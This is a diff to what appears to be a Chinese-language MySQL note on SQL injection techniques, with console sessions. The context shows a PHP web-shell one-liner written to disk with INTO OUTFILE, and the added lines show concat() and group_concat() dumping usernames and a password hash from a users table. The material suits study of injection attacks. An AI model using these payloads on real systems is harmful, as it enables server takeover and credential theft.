@@ -91,7 +91,7 @@ mysql> select load_file("/tmp/test");
 
 
 
-关于into outfile
+关于into outfile()
 =========================================================
 mysql> select "<?php @eval($_POST['x']);?>" into outfile '/tmp/a.php';
 Query OK, 1 row affected (0.01 sec)
@@ -104,4 +104,53 @@ mysql> select load_file("/tmp/a.php");
 +------------------------------+
 1 row in set (0.00 sec)
 
+
+
+关于concat()
+=========================================================
+mysql> select username,password from intel.users limit 1;
++----------+----------------------------------+
+| username | password                         |
++----------+----------------------------------+
+| admin    | e10adc3949ba59abbe56e057f20f883e |
++----------+----------------------------------+
+
+mysql> select concat(username,',',password) from intel.users limit 1 ;
++----------------------------------------+
+| concat(username,',',password)          |
++----------------------------------------+
+| admin,e10adc3949ba59abbe56e057f20f883e |
++----------------------------------------+
+
+
+
+关于group_concat()
+=========================================================
+mysql> select id,username from users ;
++----+-------------+
+| id | username    |
++----+-------------+
+|  1 | admin       |
+| 38 | taste       |
+| 41 | ??          |
+| 40 | goodmorning |
+| 42 | apple       |
+| 43 | pamxie      |
+| 44 | banana      |
+| 45 | kkkk        |
+| 46 | test        |
+| 47 | aa          |
+| 48 | aa          |
+| 49 | demon       |
+| 50 | jkjkjk      |
++----+-------------+
+
+
+mysql> select group_concat(id),group_concat(username) from users;
++---------------------------------------+-----------------------------------------------------------------------------+
+| group_concat(id)                      | group_concat(username)                                                      |
++---------------------------------------+-----------------------------------------------------------------------------+
+| 1,38,41,40,42,43,44,45,46,47,48,49,50 | admin,taste,??,goodmorning,apple,pamxie,banana,kkkk,test,aa,aa,demon,jkjkjk |
++---------------------------------------+-----------------------------------------------------------------------------+
+1 row in set (0.00 sec)
 
